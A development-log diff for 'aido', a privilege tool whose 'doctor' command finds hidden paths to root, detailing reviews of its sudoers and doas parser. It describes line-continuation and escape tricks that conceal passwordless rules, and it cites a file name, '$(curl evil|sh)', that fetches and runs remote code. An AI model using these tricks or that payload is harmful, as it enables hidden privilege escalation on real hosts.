@@ -1645,6 +1645,503 @@ probes (the image has no sudo) and one `PIDFD_GET_INFO` path in `syscall.rs`
 
 ---
 
+## 2026-10-19 — M2b step 4b, review: fifteen findings, all applied
+
+An independent review ran sudo 1.9.16p2 against the sudoers reader and found
+it printing "clean" for grants sudo honours. Every sudoers input it verified is
+now a test. Finding by finding:
+
+1. **A link to `/usr/bin` at the front of `PATH` turned the check off.** The
+   backend's directory was the first entry that *resolved* to it, with nothing
+   judged on the way. It is now the first entry that is itself clean and leads
+   to it; an entry that reaches it through something writable is a finding and
+   the search goes on (`denies_a_link_to_the_backend_directory_hiding_entries_ahead_of_it`).
+2. **Continuation and comments differed from sudo's lexer.** A backslash then
+   spaces or tabs then the newline continues (`\\[[:blank:]]*\r?\n`), a comment
+   swallows its own trailing backslash, and `!authenticate` is looked for on
+   every logical line (off a `Defaults` line it names nobody it can read: "may
+   name you"). `denies_authenticate_off_hidden_by_blanks_after_the_continuation_backslash`
+   and its siblings.
+3. **Includes.** `\ ` and `\xHH` in an include path are unescaped as sudo does;
+   an include naming a file or directory that does not exist is unverified,
+   not nothing (`denies_a_backslash_escaped_space_in_an_include_path`,
+   `an_include_naming_nothing_is_unverified_never_silently_clean`). The test
+   that was named for this and asserted the opposite now asserts it.
+4. **Sticky directories.** The owner of a link or of a file in the way is
+   checked when the directory is sticky; the fake's links have owners now.
+5. **fish.** `printable` rejects a backslash, as these notes always said it
+   did (`denies_a_printed_command_naming_a_path_that_fish_would_split`).
+6. **Names this host cannot resolve** — a user or group missing from
+   `/etc/passwd` or `/etc/group`, directory-service accounts — are "may name
+   you", never "names others"; doas quotes are stripped; the continuation
+   cases above (`a_name_this_host_cannot_resolve_is_maybe_never_names_others`).
+7. **Symlinked drop-in directories** (`foo.service.d -> /opt/foo.d`) are read.
+8. **`--fix` proposals.** A `PATH` entry is taken off the `PATH`, never
+   `chown`ed or `chmod`ed through an ancestor or a missing directory (`/tmp`);
+   a sticky directory, `/`, or any account's home directory is not handed to
+   root, what root trusts is moved out of it; and what is handed back says its
+   contents were written by someone else and must be inspected.
+9. **Root's `PATH`** is unverified when any file in the sudoers include chain
+   could not be read, because the last `secure_path` sudo reads may be there.
+10. **`--json` is ASCII.** serde_json escapes only C0 controls; U+009B, DEL,
+    and U+202E went out raw. Every non-ASCII character is now `\uXXXX` (a
+    surrogate pair above the BMP), in all of aido's JSON. The kernel line, the
+    backend's banner and refusal, and the caller-unavailable reason go through
+    `term-sanitize` in the prose.
+11. **Fifos and block devices** are judged by their mode bits like files; only
+    a character device (`/dev/null`) is judged by its owner alone
+    (`Kind::CharDevice`).
+12. **The empty-report fallback** is `unverified`, not `clean`. It cannot
+    trigger (six checks always run), so no test reaches it; it fails closed
+    anyway.
+13. **The join-aido text** no longer says the backend asks for a password
+    "every time": aido's own doas rule is `permit persist`, and sudo caches.
+14. **`SECURITY.md`** lists what `doctor` neither checks nor lists.
+15. **A test comment** said a directory that vanishes mid-read "is said"; it is
+    not, and now the comment says why.
+
+**Second round, two more, same class.** The reader was still joining lines
+where sudo and OpenDoas do not, so a rule for the caller sat unseen below.
+
+- **sudo: a `#` needs no blank before it.** sudo's lexer ends a word at `#`, so
+  `/bin/true#c \` is a comment and the backslash joins nothing. The reader had
+  required a blank, joined the next line onto an alias or `Defaults` line (never
+  read for a tag) or onto another user's rule, and the caller's `NOPASSWD` line
+  vanished. Only a `#<digits>` id is exempt now. Run against sudo 1.9.16p2;
+  `denies_a_hash_without_a_blank_swallowing_the_backslash_to_hide_a_rule_under_an_alias`
+  and `denies_a_hash_without_a_blank_swallowing_the_backslash_to_hide_the_callers_rule`.
+- **doas has its own lexer.** The sudo continuation rule (backslash, blanks,
+  newline) had been applied to doas. In OpenDoas a backslash and a blank
+  escape the blank, a continuation is a backslash immediately before the
+  newline, and `#` ends the line mid-word. Run against OpenDoas;
+  `denies_an_escaped_blank_or_a_midword_hash_hiding_a_doas_rule_below` and
+  `denies_a_doas_escaped_blank_or_midword_hash_hiding_the_callers_rule`.
+
+**Third round, the same class again.** `\\` (an escaped backslash) at the end of
+a line is a literal backslash to sudo 1.9.16p2 and to OpenDoas, but the reader
+took the last backslash for a continuation, so the caller's `NOPASSWD` or
+`nopass` rule on the next line was absorbed by a `Defaults` or alias line
+(read clean) or credited to another user's rule above it, in sudoers and in
+doas.conf. The reader now scans each line left to right: a backslash escapes
+the next byte, and a trailing backslash joins only when nothing escapes it
+(`denies_an_escaped_backslash_at_the_end_of_a_line_absorbing_the_callers_rule`,
+`denies_an_escaped_backslash_at_the_end_of_a_doas_line_absorbing_the_callers_rule`,
+`denies_an_escaped_backslash_at_end_of_line_absorbing_the_callers_rule`,
+`denies_an_escaped_hash_hiding_the_tag_behind_a_comment`).
+
+Guessing a lexer one case at a time had failed three times, so there is now a
+net under it. **Modelled, with tests**: a backslash before a backslash, before
+a `#`, before a blank, and a backslash ending the line. **Unmodelled**: a
+backslash before any other byte, and a double quote on a line that also has a
+backslash or a `#` past its first byte. An unmodelled line makes its file
+unverified and every rule on a logical line it belongs to "may name you", so
+what it joins can no longer produce a clean report or credit a rule to someone
+else (`an_unmodelled_construct_makes_what_it_could_join_unknown_never_clean`,
+`an_unmodelled_construct_cannot_make_the_passwordless_check_clean`). The
+earlier sentence that a line left apart "finds every tag" is true only of a
+line the reader does not join; it is not claimed for anything else. (The
+trailing-backslash part of this is superseded by the fifth round, below.)
+
+**Fourth round, two more.** (1) A backslash and trailing blanks glued to a
+word, path, or variable token (`Defaults:alice lecture_file=/etc/x\ `,
+`/bin/x\ `, `Host_Alias H = foo\ `, a tab, `\\\ `, a CRLF ending) is an
+escaped blank to sudo's longest-match lexer and the line ends, but the reader
+joined it, so the caller's `NOPASSWD` rule below was read clean or credited to
+alice. Which token is under way depends on the grammar's state, so the reader
+now takes such a backslash as a certain continuation only after an unescaped
+blank (or at the start of the line) or with nothing after it; anywhere else the
+line is unmodelled and fails closed
+(`denies_a_backslash_escaped_trailing_blank_absorbing_the_callers_rule`, both
+levels). (2) sudo's comment rule excludes `#-<digit>` as well as `#<digit>`:
+`#-1` is an id, so the backslash after it continues, but the reader took it for
+a comment and credited the next line to the users it names
+(`denies_a_negative_hash_id_hiding_a_continuation_as_another_users_rule`, both
+levels). The "modelled" list was exactly: `\\`, `\#`, backslash and blank,
+a trailing backslash (with trailing blanks only after a blank), `#<digit>` and
+`#-<digit>` ids. Nothing else is claimed. (The trailing backslash left the list
+in the fifth round, below; the rest stands.)
+
+**Fifth round: the decision to stop modelling continuations (2026-10-19).** Round 4's
+findings (an include path ending in a backslash absorbed the caller's rule, and
+an OpenDoas word split across a continuation, `permit nopass 10\` then `00`,
+which grants uid 1000 where the reader had read uid 10, and `:2\` then `7`,
+gid 27) were the fourth round in a row to turn up a new verified mismatch
+between the reader and a real lexer (sudo 1.9.16p2, OpenDoas 6.8.2), each one
+in line continuation. **Decided by the orchestrator, and why**: a reader that
+re-implements two lexers one counterexample at a time has no end state, and each
+miss was a false "clean" or a rule credited to someone else on a tool whose
+purpose is to say where root is reachable. So no more modelling. Every physical
+line whose last byte, past trailing whitespace, is a backslash, in both
+dialects and whatever precedes the backslash (a rule, a comment, a quote, an
+escape, a `#`, a carriage return), makes the joined logical line unmodelled.
+Every rule it could form is `Scope::Unknown` ("maybe", never "no"), the file is
+listed as unverified so that its check is never clean (the status is `Found`
+where a rule is found and `Unverified` where none is), a whole-line comment that
+ends in a backslash does the same to the next line, an include on such a line is
+still followed (by both of its paths: see the review of this round, below), and
+a tag (`NOPASSWD`, `!authenticate`, `nopass`) is looked for as a substring of
+the joined text, with and without a space at each join, so a word split across a
+join is found. The escape-aware scan stays for tag and comment detection inside
+one physical line. Cost: a file with any trailing-backslash line reports "maybe"
+and is listed as unverified, instead of a certain finding or a clean result; the
+cases that were `Found` / `Applies::Yes` are still `Found` where a rule is found
+but now read `Applies::Maybe` (or `Unverified`, where none is found), and no
+assertion moved to Clean or No. Tests:
+`denies_any_line_ending_in_a_backslash_hiding_the_callers_nopasswd_rule`
+(config) and `denies_any_line_ending_in_a_backslash_hiding_the_callers_passwordless_rule`
+(end to end, a property over every generated head, seven spellings of a sudoers
+rule and five of a doas rule that name the caller, joined to the head or after
+an ordinary line, both dialects),
+`denies_a_trailing_backslash_in_an_include_path_absorbing_the_callers_rule` and
+`denies_a_continuation_splitting_a_doas_identity_as_another_users` (both
+levels; the second now includes `:2\` then `7` for a caller in gid 27). The
+property's two halves, the rule as the very next line and the rule after an
+ordinary line, each loop over every one of the seven and five spellings.
+
+Two things found while finishing the fifth round (2026-10-21), both against the
+real programs, both with a test at each level:
+
+- **An include on the line after a backslash is a directive of its own where the
+  program does not join.** sudo reads `Defaults:alice lecture_file=/etc/x\ ` (an
+  escaped blank) and `alice ALL=(ALL) ALL # note \` (a comment that eats its
+  backslash) as ending there, so `@include /etc/sudo-extra`, `#include`,
+  `@includedir` and `#includedir` on the next line are honoured and the file
+  they name grants the caller. The joined logical line hid them (reported
+  unverified, never read). Every physical line of a joined line is now checked
+  for an include. Where the backslash does join, sudo does not honour the
+  include (it is part of the joined line, or an "invalid line continuation");
+  reading it anyway only reports more
+  (`denies_an_include_on_a_line_the_program_did_not_join_hiding_the_callers_grant`).
+- **OpenDoas drops the backslash of an escape, so `permit nopas\s yamin` is a
+  `nopass` rule** (6.8.2 grants). The line is unmodelled, but a search for the
+  tag in the text as written does not find it; a doas line is now searched as
+  written and with its backslashes removed
+  (`denies_a_doas_keyword_spelled_with_an_escape_hiding_the_callers_rule`). The
+  opposite is also true of OpenDoas and is not modelled: `nop\` then `ass` is a
+  parse error there (a word that held an escaped newline is never a keyword),
+  and is reported "maybe" all the same.
+
+**Evidence, once, by hand (2026-10-21).** 44,000 generated files, each built so that the
+caller's only way to a grant is the odd construct under test (a trailing
+backslash of every shape before a rule, a word split across a join, an include
+path ending in a backslash, escapes, quotes, `#` in the middle of a word, CRLF,
+alias and `Defaults` forms, and as many spellings of the rule itself), were run
+through sudo 1.9.16p2 (`sudo -n true` as the caller) and OpenDoas 6.8.2 (`doas
+-n true`), the 24,000 sudoers files among them through sudo-rs 0.2.5 as well,
+and through the doctor. The programs let the caller run with no password in
+21,674 of the 44,000 files and in 13,087 of the 24,000 under sudo-rs. For every
+one of them the doctor reported at least one rule that was not "names others",
+so none read clean and none was credited only to someone else. The round-4
+reader, on the same files, read clean or credited only others in 210 (`@include
+/p\` and the caller's rule below it read clean, `10\` then `00` credited to uid
+10, `:2\` then `7` to gid 2), and showed only others' rules beside an
+unverified note in 321 more (`permit nopas\s yamin` among them), which is the
+check that the corpus can see these. The corpus held no include whose target is
+a file named with a trailing backslash, so it could not see the first finding of
+the review below. The generators and the Docker image are not in the repository;
+the oracle below makes them unnecessary.
+
+**Review of the fifth round: four findings (2026-10-21), each reproduced before
+it was fixed.**
+
+- **An include path keeps its trailing backslash, and the reader cut it off.**
+  The decision said an include on a line that ends in a backslash "is still
+  followed", and it was: to the path with the backslash dropped. sudo's include
+  token (`toke.l`, state `GOTINC`) takes everything up to a blank, and `fill()`
+  leaves a final backslash literal, so `@include /etc/s2/a\` opens the file
+  named `a\`, and the line after it is a rule of its own. Where `a\` granted
+  the caller and `a` held another user's rule, the report's only finding was
+  "names others" while the caller had passwordless root. Reproduced against
+  sudo 1.9.16p2 for `@include`, `#include`, `@includedir` and `#includedir`, on
+  the first line and after `lecture_file=/etc/x\ ` or `# note \`, with CRLF,
+  and with a backslash and a blank after the path (an escaped blank, so the
+  file is `a` and a blank). sudo-rs refuses `@include /p\` outright ("use quotes
+  around filenames or escape whitespace"), so nothing is granted there. Both
+  paths are now followed: the line with its trailing backslash cut off (where
+  the backslash is a continuation, as after a blank, which sudo also honours
+  before it rejects the line that follows) and as written, which is what sudo
+  opens. A path that is not there is reported as unverified, so reading both
+  only adds to what is reported. Tests, each with an end-to-end twin:
+  `denies_an_include_path_keeping_its_backslash_hiding_the_file_sudo_opens`,
+  `denies_an_include_on_a_later_line_keeping_its_backslash_hiding_the_file_sudo_opens`,
+  and the existing `denies_a_trailing_backslash_in_an_include_path_absorbing_the_callers_rule`,
+  now asserting both paths. The end-to-end tests put another user's grant in
+  `a` and the caller's in `a\` (and the reverse, after a blank) and require the
+  caller's grant to be reported, never only "names others". Evidence, once, by
+  hand: 2,304 generated sudoers files (four directive spellings, eight endings
+  of the path, six heads, three lines after it, LF and CRLF, and two
+  arrangements of which name holds the caller's grant and which another user's)
+  were run through sudo 1.9.16p2, which let the caller run with no password in
+  640 of them, and through the doctor. The reader of the first fifth-round pass
+  showed only another user's rule beside an unverified note in 320 of the 640;
+  the corrected reader reported a rule that is not "names others" in all 640,
+  and in all 160 that sudo-rs 0.2.5 grants. The earlier 44,000 files, run again
+  through the corrected reader, read as before: none the program granted read
+  clean or only as others'.
+- **The status says what it found.** `Found` where a rule is found, `Unverified`
+  where none is, and never `Clean`; the file is listed as unverified in both
+  cases. This record, the commit message, `SECURITY.md`, and the step's entry in
+  `docs/todo/README.md` said the check "is unverified" or "lands on
+  `Unverified`", which is true only where no rule is found.
+  `assert_maybe_never_clean` now asserts `Found`. The property's
+  after-an-ordinary-line half had used the first spelling only; it loops over
+  every one.
+- **Root's `PATH` blamed an unreadable file for a file that was read.** A
+  readable sudoers file with one continuation line made the root-`PATH` check
+  unverified with "a sudoers file that could not be read ... the stock
+  directories were examined instead", and neither was true. A file that was read
+  and has a line aido does not model is now kept apart from one that could not
+  be read: root's `PATH` says "`secure_path` may be set on a line aido does not
+  model, in a sudoers file it read", counting those files, and the `secure_path`
+  it did find is examined and reported as before. A file that could not be read
+  keeps its own reason, so the two are separate entries when both apply
+  (`denies_blaming_an_unreadable_file_for_a_root_path_gap_in_a_file_that_was_read`,
+  `root_path_names_each_cause_of_a_gap_once_and_counts_each_kind_apart`,
+  `an_unreadable_sudoers_and_an_unmodelled_drop_in_are_both_said_for_root_path`).
+- **The branch was rebased onto the main of the day.** The crate table in
+  `CLAUDE.md` was rewritten on main while the step was being finished; the
+  `aido-bin` row keeps the clause about `PATH`, and
+  `crates/aido-tests/tests/crate_inventory.rs` passes against the merged tables.
+
+**Review of the sixth round: one major, two minor (2026-10-21), each reproduced
+before it was fixed.**
+
+- **An include that the candidates cannot reach was still read only as
+  "names others".** The fifth round followed an include on a joined line to the
+  path with its backslash cut off and as written. Two shapes open a file that
+  is neither, and sudo 1.9.16p2 grants the caller through each (thirteen
+  inputs, `PASSWORDLESS` for all of them; sudo-rs 0.2.5 grants none of the
+  thirteen):
+  a backslash-newline *inside the quotes* of an include path is dropped and the
+  path continues (`@include "/etc/s4/a\` then `b"` opens `/etc/s4/ab`; `toke.l`
+  line 786, the `<GOTINC>` state), for all four directive spellings, with LF and
+  CRLF, with a blank after the backslash, with blanks leading the next line,
+  and on a later line; and an include path may start on the continuation line
+  of its directive (`@include\` then `/etc/s6/a\`; `toke.l` lines 173 and
+  858). The reader named only plain-named files, where another user's grant
+  was, and the report's only findings were "names others".
+- **The decision: contain, do not model more of `toke.l`.** Plan item B2's rule
+  is that any line continuation, in either dialect, makes the result "maybe",
+  never "no". Chasing a third and fourth shape is the race plan item D3 exists
+  to end. So the paths followed are now hints, not the file sudo opens, and the
+  guarantee is a finding of its own: a line that is not settled and holds the
+  word `include`, in a physical line or across a join (`@incl\` then `ude`),
+  adds a `Grant::Include` finding with scope unknown ("may name you"), on the
+  physical line that holds the word. The report can no longer show only
+  "names others" while such an include stands, and the check is never clean. A
+  settled include on a modelled line adds nothing. The wire carries a new value,
+  `"grant": "include"`; the human line reads `include (may name you)`. The
+  proposal for a file with such a line asks for the include to be rewritten on
+  one physical line, with no backslash continuation, so that it can be checked,
+  and never to remove a tag from it. OpenDoas has no include directive.
+- **Evidence.** Against the real programs, in Docker (sudo 1.9.16p2, sudo-rs
+  0.2.5, OpenDoas 6.8.2): the thirteen inputs above, three controls, and 596
+  generated files (four directives, seven shapes, five heads, LF and CRLF, with
+  and without a rule after): sudo let the caller run with no password in 366,
+  the corrected reader reported a finding that is not "names others" in all
+  366, and the reader of the fifth-round commit did so in only 65 (301 weak).
+  Of those, sudo-rs grants 33, all reported. The earlier corpora, run again:
+  2,304 include files (640 granted by sudo, 160 by sudo-rs) and 44,000 others
+  (6,038, 2,481 and 13,155 granted): none the program granted read clean or
+  only as another user's.
+- **A carriage return on a later line.** No test pinned the strip of a `\r`
+  from an include on a later physical line; one mutant (keeping it) survived.
+  Added to both levels, `denies_a_carriage_return_ending_a_later_include_line_...`.
+  Every mutant of the round's code is killed by a named test but the one that
+  changes nothing (`joined.uncertain |=`, a joined line being uncertain from its
+  first line already).
+- **The branch was rebased onto the main of the day** (the broker, then a docs
+  commit), keeping main's crate rows and the `aido-bin` clause about `PATH`.
+
+**Follow-up, plan item D3 (`docs/todo/m2b-finish-plan.md`), not done: ask the
+program instead of re-implementing its lexer.** This is the real fix for the
+class, and the decisions above are the containment until it lands; the include
+finding is the one it replaces first. `doas -C
+<file> <cmd>` run unprivileged answers permit / nopass / deny for the caller;
+`sudo -l -U <user>` answers for a user when run as root. Either replaces the
+reader for the files it covers and turns "maybe" into a fact, with the hand
+reader kept as a hint for what the program cannot be asked. Neither is a
+substitute for the unmodelled-means-unverified rule where the program is absent
+or the caller lacks the privilege to ask.
+
+---
+
+## 2026-10-19 — M2b step 4b: `doctor --json`, `--fix`, and every other path to root
+
+**Why it matters.** aido decides whether one command may run as root, which
+protects nothing on a host where the same caller already has another way
+there. `SECURITY.md` said so and said `doctor` could not tell you. Now it can,
+within the limits written down below.
+
+**What exists now.**
+
+- **`aido_backend::paths_to_root`, the report, pure.** It asks a `HostView`
+  six things — the caller's ids and groups, `lstat`, the contents of a regular
+  file, a directory listing, `readlink`, and `access(W_OK)` — each documented
+  with the kernel's semantics, so the fake and the real thing answer alike.
+  `MemoryHost` is the fake (relative link targets from the link's directory,
+  `..` taken physically, unsearchable directories, `ENOTDIR` as missing);
+  `aido_sys::LiveHost` is the real one: `std::fs` and rustix (feature
+  `process` added, for `getuid`/`getgid`/`getgroups`), unprivileged, reading
+  regular files only, opened `O_NONBLOCK | O_NOCTTY` and judged on the
+  descriptor, capped at 4 MiB, so a fifo or a device someone left in a
+  directory cannot stall it.
+- **Six checks, always all six, in a fixed order**, each `skipped`, `clean`,
+  `unverified`, or `found`, with what was examined, the findings, what could
+  not be examined and why, and a note. *Unverified is never clean*: a check
+  that met anything it could not read cannot report clean, and the prose says
+  how to see more (`sudo aido doctor`), keeping the unprivileged run for the
+  checks that only mean something as the user.
+  1. Passwordless rules: `NOPASSWD`, `!authenticate`, doas `nopass`, in
+     `/etc/sudoers`, `/etc/sudoers-rs`, everything they include (sudo's
+     dot-and-tilde rule honoured, `%h` unverified, nesting past 8 unverified),
+     `/etc/doas.conf`, and `/etc/doas.d`. A conservative token scan, not a
+     parser: every ambiguity reports. When `/etc/sudoers` cannot be read —
+     the normal case, `0440` — `/etc/sudoers.d` is read anyway, which is where
+     a cloud image's standing grant lives
+     (`denies_a_cloud_images_standing_grant_behind_an_unreadable_sudoers`).
+  2. Membership, listed in `/etc/group` or held by the session, of `sudo`,
+     `wheel`, `admin` (Ubuntu's sudo group before 12.04, still in its sudoers),
+     `docker`, `lxd`, `incus-admin` (lxd after the fork), `libvirt` (a VM with
+     the host's disks), `disk` (raw writes below every permission check), and
+     `input` (reads the password typed at a sudo prompt). A held gid with no
+     local name is unverified: it could be any of them under a directory
+     service.
+  3. Unit and generator directories (18, from `systemd.unit(5)` and
+     `systemd.generator(7)`, plus `/lib`), their entries, drop-ins, and what
+     their links name.
+  4. Root's `PATH`: the `secure_path` sudoers sets, and the stock directories
+     always.
+  5. Your `PATH`, **ahead of the backend's directory only**: a program named
+     `sudo` there runs when the human types `sudo` and is handed the password;
+     one behind it is never reached by that name. The rest are counted in a
+     note.
+  6. The files root's shells read (bash, sh, zsh, fish; Debian and Fedora
+     spellings; `/etc/environment`), their drop-in directories, and the rc
+     files in root's home, which an unprivileged run reports once, as one
+     unverified entry, rather than nine times.
+- **"Writable" follows the kernel.** A path is looked up one component at a
+  time, links one hop at a time, and every directory passed through *and every
+  link's directory* is judged: owner if not root, group-writable, world-writable,
+  or `access(2)` for what the mode bits do not show. So
+  `/usr/bin/editor -> /etc/alternatives/editor -> /usr/bin/vim.basic` is judged
+  on `/etc/alternatives` too, which a check of the resolved path never looks at
+  (`denies_repointing_a_link_through_its_intermediate_directory`). Links among a
+  trusted directory's entries are followed (`systemctl link`), and a link named
+  like a drop-in directory that leads to a directory is read like one. A sticky
+  ancestor shields an entry from rename but a sticky target still lets anyone
+  create one, and in a sticky directory (`/tmp`) the *owner* of a link, or of a
+  file standing where a directory should be, may delete and replace it
+  (`denies_a_caller_owned_link_in_a_sticky_directory_steering_a_path_entry`). A
+  character device is judged by its owner alone: `/dev/null`,
+  which every masked unit names, is `0666` and holds nothing.
+- **`aido doctor --json`** (or `--output json doctor`): a versioned envelope,
+  `schema_version` 1, `snake_case` fields — `aido_version`, `platform`,
+  `exec_path`, `kernel` (version, attestation mechanism and since, whether the
+  agent path is available and why not, resolution, summary), `ruleset` (dir,
+  what loaded or why not, the descriptor-verified trust walk), `caller`
+  (classification, password required, hints recorded and trusted — zero),
+  `backend` (status `usable | unusable | none`, `implementation` sudo /
+  sudo-rs / doas, exe, version, every capability probed with supported and
+  required, missing required, refusal), `paths_to_root`, and `proposals`
+  (`null` without `--fix`). A refused backend still reports its whole matrix:
+  `aido_backend::detect` is now `identify` then `judge`, and a test pins that
+  it stays exactly that. Five snapshots pin the envelope and the prose.
+- **The prose keeps every existing line byte for byte** — the differential
+  matrix reads them — and adds the report after `exec path`. Every string that
+  came from the machine goes through `term-sanitize` and is flagged when
+  anything was removed (`denies_a_file_name_that_would_rewrite_the_terminal`).
+- **`PATH` is read once, by `aido-bin`**, and handed in as `aido::Invocation`;
+  the library still reads no environment. `aido::run` takes the invocation,
+  and `run_with` takes a `Platform` (ops, probe, host, path) where it took ops
+  and probe. `CLAUDE.md`'s row for `aido-bin` says so.
+
+**Decision: `--fix` prints and applies nothing.** Each proposal is an id, a
+title, what accepting it means, and either the exact argv — the backend in
+front for anything that needs root — or a by-hand instruction. It does not
+offer to run them, and it does not build a typed confirmation, because:
+
+- a yes read from this process's terminal is one the requesting process tree
+  can type: an agent drives a pty as easily as a human does (invariant 3);
+- running `sudo` from inside aido may not ask at all — a cached credential, or
+  a standing `NOPASSWD` rule, which is exactly what this report finds — so an
+  agent that runs `aido doctor --fix` would make a privilege change no human
+  saw.
+
+Printed, a command is run by a human in a shell they started, where the
+backend asks for their password: on the password path, the password is the
+confirmation. The only grant on offer is the `aido` group, whose every use
+asks for a password; everything else removes a way to root.
+`no_proposal_ever_grants_a_passwordless_path_or_skips_the_backend` holds that
+over a machine with every kind of finding. Phase 3 § 2.1 said `--fix`
+"requires confirmation" for the group grant; this is that confirmation, and
+the deviation is that aido asks for nothing itself.
+
+**A printed command is a command someone will paste.** A world-writable
+directory lets anyone name a file `$(curl evil|sh)`. A command is printed only
+when every argument is printable ASCII without a backslash (shells disagree
+about backslashes inside quotes), and each argument is single-quoted for the
+shell; anything else becomes a by-hand instruction naming the path through the
+sanitizer (`denies_a_command_built_from_a_name_a_shell_would_reinterpret`,
+`denies_a_printed_command_that_a_shell_would_split_or_expand`).
+
+**Recovered work, and what review of it changed.** An earlier agent wrote the
+pure module and its tests and died on an API outage before compiling them.
+Kept: the model, the sudoers and doas readers, the accounts parser, the fake,
+the proposals. Changed after reading it against the goal: the walk resolved a
+path with `canonical()` and examined only the two ends, missing every
+intermediate link's directory; a trusted directory's link entries were never
+followed; `/dev/null` made every masked unit a finding; `--fix` offered
+nothing for a root-trusted directory the user owns (the most direct way to
+root of all); writable `PATH` entries behind the backend were findings; the
+fake treated every link target as absolute and dropped `..`; its builder
+`writable()` shadowed the trait's `writable`; `config::number` had a branch no
+input reaches. The tests were rewritten so no region in them is reachable only
+by a failing test.
+
+**Measured.** `just verify`: 100% lines, regions, and functions, clippy and
+`cargo deny` clean. `just check-linux` clean on both targets. `just
+linux-test`: all 996 tests on Linux 6.12 aarch64 as uid 1000. The coverage
+gate run in that same container puts every file this step touches at 100%;
+the workspace reads 99.9% there only because the `rust:slim` image has no
+`sudo`, so `HostProbe`'s functional probes never run, and its 6.12 kernel
+never takes the `PIDFD_GET_INFO` success path. CI's runners have both, which
+is why the gate measures there.
+
+**Open.**
+
+1. **Not examined at all**: cron (`/etc/cron.d`, `/etc/cron.*`,
+   `/var/spool/cron`), `/etc/ld.so.preload` and `/etc/ld.so.conf.d`, PAM
+   configuration, polkit rules, set-user-ID programs and file capabilities,
+   kernel module directories, sudo rules in LDAP or SSSD, and memberships a
+   directory service holds. Cron is the next one worth adding: root executes
+   from it exactly as it does from a unit directory.
+2. **sudoers is read conservatively**: aliases are not resolved (an alias is
+   "may name you"), a `#` mid-line does not end the line for the purpose of
+   finding a tag (it does end a continuation, as in sudo), a name that is not
+   in `/etc/passwd` or `/etc/group` is "may name you", and a rule to a
+   non-root runas user is still reported. A false positive is shown with its line, so
+   an operator can dismiss it; a false negative would be shown nowhere.
+3. **Run as root, it describes root.** Which rules name *the human* is not
+   computed then, and `SUDO_UID` is not read, because it is the environment.
+   Two runs, as the user and as root, is the documented way; a `--user` option
+   is not built.
+4. **`--fix` does not touch aido's own sudoers file.** The snippet's header
+   says to run `aido doctor --fix` instead of editing it; checking
+   `/etc/sudoers.d/aido` against what aido would write, and offering the fix,
+   needs the executing installer (step 5).
+5. **Phase 3 § 2.2**, the shipped-versus-loaded version of each rule file,
+   needs a package to compare against.
+6. **The envelope's paths go through `Path::display`**, lossy for bytes that
+   are not UTF-8; the prose sanitizes from the bytes and says so.
+7. **`doctor` exits 0 whatever it finds.** It is diagnostic; a CI that wants
+   to fail on a finding reads `paths_to_root.status` from `--json`.
+8. **An ACL that lets someone else write** shows only through the group bits it
+   sets, and is reported against the owning group; `getfacl` is what `--fix`
+   points at when only `access(2)` saw it.
+
+---
+
 ## 2026-10-19 — `howiwork.md`: the product source of truth, and the merged vision
 
 A product vision document arrived (permission sets and PRS, `airead`,
